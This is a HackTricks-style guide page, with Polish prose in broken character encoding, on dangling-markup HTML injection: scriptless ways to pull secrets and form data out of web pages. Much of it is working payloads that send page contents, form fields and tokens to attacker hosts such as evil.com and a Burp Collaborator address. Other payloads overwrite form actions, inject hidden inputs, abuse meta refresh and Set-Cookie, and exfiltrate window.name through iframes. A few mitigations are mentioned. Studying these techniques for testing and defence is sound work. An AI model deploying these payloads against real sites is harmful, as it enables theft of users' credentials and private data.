# Dangling Markup - HTML scriptless injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Resume

Ta technika moÅ¼e byÄ‡ uÅ¼ywana do wyciÄ…gania informacji od uÅ¼ytkownika, gdy **znaleziono wstrzykniÄ™cie HTML**. Jest to bardzo przydatne, jeÅ›li **nie znajdziesz Å¼adnego sposobu na wykorzystanie** [**XSS** ](../xss-cross-site-scripting/), ale moÅ¼esz **wstrzyknÄ…Ä‡ kilka znacznikÃ³w HTML**.\
Jest to rÃ³wnieÅ¼ przydatne, jeÅ›li jakiÅ› **sekret jest zapisany w postaci czystego tekstu** w HTML i chcesz go **wyekstrahowaÄ‡** z klienta, lub jeÅ›li chcesz wprowadziÄ‡ w bÅ‚Ä…d w wykonaniu jakiegoÅ› skryptu.

Kilka technik omÃ³wionych tutaj moÅ¼e byÄ‡ uÅ¼ytych do obejÅ›cia niektÃ³rych [**Content Security Policy**](../content-security-policy-csp-bypass/) poprzez wyekstrahowanie informacji w nieoczekiwany sposÃ³b (znaczniki html, CSS, znaczniki http-meta, formularze, base...).

## Main Applications

### Stealing clear text secrets

JeÅ›li wstrzykniesz `<img src='http://evil.com/log.cgi?` podczas Å‚adowania strony, ofiara wyÅ›le ci caÅ‚y kod miÄ™dzy wstrzykniÄ™tym znacznikiem `img` a nastÄ™pnym cudzysÅ‚owem w kodzie. JeÅ›li sekret znajduje siÄ™ w tym kawaÅ‚ku, ukradniesz go (moÅ¼esz zrobiÄ‡ to samo uÅ¼ywajÄ…c podwÃ³jnego cudzysÅ‚owu, sprawdÅº, co moÅ¼e byÄ‡ bardziej interesujÄ…ce do uÅ¼ycia).

JeÅ›li znacznik `img` jest zabroniony (na przykÅ‚ad z powodu CSP), moÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
ZauwaÅ¼, Å¼e **Chrome blokuje adresy URL HTTP** zawierajÄ…ce "<" lub "\n", wiÄ™c moÅ¼esz sprÃ³bowaÄ‡ innych schematÃ³w protokoÅ‚Ã³w, takich jak "ftp".

MoÅ¼esz rÃ³wnieÅ¼ naduÅ¼yÄ‡ CSS `@import` (wyÅ›le caÅ‚y kod, aÅ¼ znajdzie ";")
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ **`<table`**:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
MoÅ¼esz rÃ³wnieÅ¼ wstawiÄ‡ tag `<base`. Wszystkie informacje bÄ™dÄ… wysyÅ‚ane, dopÃ³ki cytat nie zostanie zamkniÄ™ty, ale wymaga to interakcji ze strony uÅ¼ytkownika (uÅ¼ytkownik musi kliknÄ…Ä‡ w jakiÅ› link, poniewaÅ¼ tag base zmieniÅ‚ domenÄ™ wskazywanÄ… przez link):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### KradzieÅ¼ formularzy
```html
<base href='http://evil.com/'>
```
Then, formularze, ktÃ³re wysyÅ‚ajÄ… dane do Å›cieÅ¼ki (jak `<form action='update_profile.php'>`), bÄ™dÄ… wysyÅ‚aÄ‡ dane do zÅ‚oÅ›liwej domeny.

### Stealing forms 2

Ustaw nagÅ‚Ã³wek formularza: `<form action='http://evil.com/log_steal'>`, to nadpisze nastÄ™pny nagÅ‚Ã³wek formularza, a wszystkie dane z formularza zostanÄ… wysÅ‚ane do atakujÄ…cego.

### Stealing forms 3

Przycisk moÅ¼e zmieniÄ‡ adres URL, do ktÃ³rego informacje z formularza bÄ™dÄ… wysyÅ‚ane, za pomocÄ… atrybutu "formaction":
```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Napastnik moÅ¼e to wykorzystaÄ‡ do kradzieÅ¼y informacji.

ZnajdÅº [**przykÅ‚ad tego ataku w tym opisie**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### KradzieÅ¼ tajemnic w postaci czystego tekstu 2

UÅ¼ywajÄ…c wspomnianej wczeÅ›niej techniki do kradzieÅ¼y formularzy (wstrzykiwanie nowego nagÅ‚Ã³wka formularza), moÅ¼esz nastÄ™pnie wstrzyknÄ…Ä‡ nowe pole wejÅ›ciowe:
```html
<input type='hidden' name='review_body' value="
```
i to pole wejÅ›ciowe bÄ™dzie zawieraÄ‡ caÅ‚Ä… zawartoÅ›Ä‡ miÄ™dzy jego podwÃ³jnymi cudzysÅ‚owami a nastÄ™pnym podwÃ³jnym cudzysÅ‚owem w HTML. Atak ten Å‚Ä…czy "_**KradzieÅ¼ jawnych sekretÃ³w**_" z "_**KradzieÅ¼Ä… formularzy2**_".

MoÅ¼esz zrobiÄ‡ to samo, wstrzykujÄ…c formularz i tag `<option>`. Wszystkie dane aÅ¼ do znalezienia zamkniÄ™tego `</option>` zostanÄ… wysÅ‚ane:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Wstrzykiwanie parametrÃ³w formularza

MoÅ¼esz zmieniÄ‡ Å›cieÅ¼kÄ™ formularza i wstawiÄ‡ nowe wartoÅ›ci, aby wykonaÄ‡ nieoczekiwanÄ… akcjÄ™:
```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### KradzieÅ¼ tajemnic w czystym tekÅ›cie za pomocÄ… noscript

`<noscript></noscript>` To tag, ktÃ³rego zawartoÅ›Ä‡ bÄ™dzie interpretowana, jeÅ›li przeglÄ…darka nie obsÅ‚uguje JavaScript (moÅ¼esz wÅ‚Ä…czyÄ‡/wyÅ‚Ä…czyÄ‡ JavaScript w Chrome w [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Sposobem na wyeksfiltrowanie zawartoÅ›ci strony internetowej od punktu wstrzykniÄ™cia do doÅ‚u na kontrolowanÄ… przez atakujÄ…cego stronÄ™ bÄ™dzie wstrzykniÄ™cie tego:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Bypassing CSP with user interaction

Z tego [badania portswiggers](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) moÅ¼esz siÄ™ dowiedzieÄ‡, Å¼e nawet z **najbardziej ograniczonych** Å›rodowisk **CSP** moÅ¼na nadal **ekstrahowaÄ‡ dane** z pewnÄ… **interakcjÄ… uÅ¼ytkownika**. W tej okazji uÅ¼yjemy Å‚adunku:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
ZauwaÅ¼, Å¼e poprosisz **ofiarÄ™** o **klikniÄ™cie w link**, ktÃ³ry **przekieruje** jÄ… do **Å‚adunku** kontrolowanego przez ciebie. ZauwaÅ¼ rÃ³wnieÅ¼, Å¼e atrybut **`target`** wewnÄ…trz tagu **`base`** bÄ™dzie zawieraÅ‚ **zawartoÅ›Ä‡ HTML** aÅ¼ do nastÄ™pnego pojedynczego cudzysÅ‚owu.\
To spowoduje, Å¼e **wartoÅ›Ä‡** **`window.name`** po klikniÄ™ciu w link bÄ™dzie zawieraÄ‡ caÅ‚Ä… tÄ™ **zawartoÅ›Ä‡ HTML**. Dlatego, poniewaÅ¼ **kontrolujesz stronÄ™**, na ktÃ³rÄ… ofiara przechodzi, klikajÄ…c link, moÅ¼esz uzyskaÄ‡ dostÄ™p do **`window.name`** i **ekstrahowaÄ‡** te dane:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Misleading script workflow 1 - HTML namespace attack

Wstaw nowy tag z id wewnÄ…trz HTML, ktÃ³ry nadpisze nastÄ™pny i z wartoÅ›ciÄ…, ktÃ³ra wpÅ‚ynie na przebieg skryptu. W tym przykÅ‚adzie wybierasz, z kim informacja bÄ™dzie dzielona:
```html
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### MylÄ…cy przepÅ‚yw skryptu 2 - Atak na przestrzeÅ„ nazw skryptu

UtwÃ³rz zmienne wewnÄ…trz przestrzeni nazw javascript, wstawiajÄ…c tagi HTML. NastÄ™pnie ta zmienna wpÅ‚ynie na przepÅ‚yw aplikacji:
```html
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
...
}
```
### NaduÅ¼ycie JSONP

JeÅ›li znajdziesz interfejs JSONP, moÅ¼esz byÄ‡ w stanie wywoÅ‚aÄ‡ dowolnÄ… funkcjÄ™ z dowolnymi danymi:
```html
<script src='/editor/sharing.js'>:              â† Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
set_sharing({ ... })
```
Lub moÅ¼esz nawet sprÃ³bowaÄ‡ wykonaÄ‡ jakiÅ› javascript:
```html
<script src='/search?q=a&call=alert(1)'></script>
```
### Iframe abuse

Dokument podrzÄ™dny ma moÅ¼liwoÅ›Ä‡ przeglÄ…dania i modyfikowania wÅ‚aÅ›ciwoÅ›ci `location` swojego rodzica, nawet w sytuacjach miÄ™dzy ÅºrÃ³dÅ‚ami. UmoÅ¼liwia to osadzenie skryptu w **iframe**, ktÃ³ry moÅ¼e przekierowaÄ‡ klienta na dowolnÄ… stronÄ™:
```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
To moÅ¼na zÅ‚agodziÄ‡ za pomocÄ… czegoÅ› takiego: `sandbox=' allow-scripts allow-top-navigation'`

Iframe moÅ¼e byÄ‡ rÃ³wnieÅ¼ naduÅ¼ywany do wycieku wraÅ¼liwych informacji z innej strony **uÅ¼ywajÄ…c atrybutu nazwy iframe**. Dzieje siÄ™ tak, poniewaÅ¼ moÅ¼na stworzyÄ‡ iframe, ktÃ³ry iframe'uje siebie, naduÅ¼ywajÄ…c wstrzykiwania HTML, co sprawia, Å¼e **wraÅ¼liwe informacje pojawiajÄ… siÄ™ wewnÄ…trz atrybutu nazwy iframe**, a nastÄ™pnie uzyskaÄ‡ dostÄ™p do tej nazwy z poczÄ…tkowego iframe i jÄ… wyciekowaÄ‡.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
For more info check [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abuse

MoÅ¼esz uÅ¼yÄ‡ **`meta http-equiv`**, aby wykonaÄ‡ **kilka dziaÅ‚aÅ„**, takich jak ustawienie ciasteczka: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` lub wykonanie przekierowania (w tym przypadku po 5s): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

MoÅ¼na to **uniknÄ…Ä‡** za pomocÄ… **CSP** dotyczÄ…cego **http-equiv** ( `Content-Security-Policy: default-src 'self';`, lub `Content-Security-Policy: http-equiv 'self';`)

### New \<portal HTML tag

MoÅ¼esz znaleÅºÄ‡ bardzo **interesujÄ…ce badania** na temat podatnych na exploity luk w tagu \<portal [tutaj](https://research.securitum.com/security-analysis-of-portal-element/).\
W momencie pisania tego tekstu musisz wÅ‚Ä…czyÄ‡ tag portal w Chrome w `chrome://flags/#enable-portals`, inaczej nie bÄ™dzie dziaÅ‚aÄ‡.
```html
<portal src='https://attacker-server?
```
### HTML Leaks

Nie wszystkie sposoby na wyciek Å‚Ä…cznoÅ›ci w HTML bÄ™dÄ… przydatne dla Dangling Markup, ale czasami mogÄ… pomÃ³c. SprawdÅº je tutaj: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

To jest **mieszanka** miÄ™dzy **dangling markup a XS-Leaks**. Z jednej strony luka pozwala na **wstrzykniÄ™cie HTML** (ale nie JS) na stronÄ™ o **tej samej domenie**, ktÃ³rÄ… bÄ™dziemy atakowaÄ‡. Z drugiej strony nie bÄ™dziemy **atakowaÄ‡** bezpoÅ›rednio strony, na ktÃ³rÄ… moÅ¼emy wstrzyknÄ…Ä‡ HTML, ale **innÄ… stronÄ™**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Search sÄ… ukierunkowane na **ekstrakcjÄ™ informacji z rÃ³Å¼nych ÅºrÃ³deÅ‚** poprzez naduÅ¼ywanie **atakÃ³w bocznych**. Dlatego jest to inna technika niÅ¼ Dangling Markup, jednak niektÃ³re z technik naduÅ¼ywajÄ… wÅ‚Ä…czenia tagÃ³w HTML (z i bez wykonania JS), jak [**CSS Injection**](../xs-search/#css-injection) lub [**Lazy Load Images**](../xs-search/#image-lazy-loading)**.**

{% content-ref url="../xs-search/" %}
[xs-search](../xs-search/)
{% endcontent-ref %}

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## References

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
